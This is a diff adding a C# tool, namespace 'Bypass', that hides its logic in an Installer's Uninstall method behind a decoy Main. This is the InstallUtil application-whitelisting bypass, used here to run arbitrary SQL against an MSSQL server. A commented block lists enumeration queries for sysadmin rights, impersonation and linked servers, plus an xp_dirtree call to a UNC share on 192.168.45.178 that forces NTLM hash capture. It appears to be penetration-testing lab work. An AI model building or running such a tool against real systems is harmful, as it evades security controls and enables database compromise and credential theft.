@@ -1,0 +1,148 @@
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Configuration.Install;
+using System.IO;
+using System.Collections.ObjectModel;
+using System.Text;
+using System.Data.SqlClient;
+using System.Collections.Generic;
+
+namespace Bypass
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("This is the main method which is a decoy");
+
+        }
+    }
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            string sqlServer = "", database = "", Cmds = "";
+            string[] execCmds;
+
+            sqlServer = this.Context.Parameters["sqlServer"];
+            database = this.Context.Parameters["database"];
+            Cmds = this.Context.Parameters["cmds"];
+
+            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
+            SqlConnection con = new SqlConnection(conString);
+            try
+            {
+                con.Open();
+                Console.WriteLine("Auth success!");
+            }
+            catch
+            {
+                Console.WriteLine("Auth failed");
+                Environment.Exit(0);
+            }
+
+
+            //String execCmd = null;
+            SqlCommand command = null;
+            SqlDataReader reader = null;
+
+
+            /*string[] execCmds = {
+                "EXEC sp_linkedservers;",
+                "SELECT SYSTEM_USER;",
+                "SELECT is_srvrolemember('sysadmin');",
+                "SELECT name FROM master..syslogins;",
+                "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';",
+                "SELECT name FROM master..sysdatabases;",
+                "EXEC master..xp_dirtree '\\\\192.168.45.178\\test';"
+            };*/
+
+
+            string[] delimiter = { "---" };
+            execCmds = Cmds.Split(delimiter, StringSplitOptions.RemoveEmptyEntries);
+            int[] output_len = { };
+
+            for (int i = 0; i < execCmds.Length; i++)
+            {
+                try { 
+                    command = new SqlCommand(execCmds[i], con);
+                    reader = command.ExecuteReader();
+
+                    Console.WriteLine("\nEXEC " + i + " : " + execCmds[i]);
+
+                    var tableData = new List<string[]>();
+                    var columnHeaders = new string[reader.FieldCount];
+
+                    for (int col = 0; col < reader.FieldCount; col++)
+                    {
+                        columnHeaders[col] = reader.GetName(col);
+                    }
+
+                    while (reader.Read())
+                    {
+                        var row = new string[reader.FieldCount];
+                        for (int col = 0; col < reader.FieldCount; col++)
+                        {
+                            row[col] = reader[col]?.ToString() ?? "NULL";
+                        }
+                        tableData.Add(row);
+                    }
+                    
+
+                    int[] columnWidths = new int[reader.FieldCount];
+                    for (int col = 0; col < reader.FieldCount; col++)
+                    {
+                        // Start with header width
+                        columnWidths[col] = columnHeaders[col].Length;
+
+                        // Check all data rows for this column
+                        foreach (var row in tableData)
+                        {
+                            if (row[col].Length > columnWidths[col])
+                                columnWidths[col] = row[col].Length;
+                        }
+
+                        // Add some padding
+                        columnWidths[col] += 2;
+                    }
+
+                    // Print headers
+                    for (int col = 0; col < reader.FieldCount; col++)
+                    {
+                        Console.Write("\t"+columnHeaders[col].PadRight(columnWidths[col]));
+                    }
+                    Console.WriteLine();
+
+                    // Print separator line
+                    for (int col = 0; col < reader.FieldCount; col++)
+                    {
+                        Console.Write("\t" + new string('-', columnWidths[col]));
+                    }
+                    Console.WriteLine();
+
+                    // Print all data rows with proper alignment
+                    foreach (var row in tableData)
+                    {
+                        for (int col = 0; col < reader.FieldCount; col++)
+                        {
+                            Console.Write("\t" + row[col].PadRight(columnWidths[col]));
+                        }
+                        Console.WriteLine();
+                    }
+
+                    reader.Close();
+
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[!] Error executing {execCmds[i]}: {ex.Message}");
+                }
+            }
+
+            con.Close();
+
+        }
+    }
+}
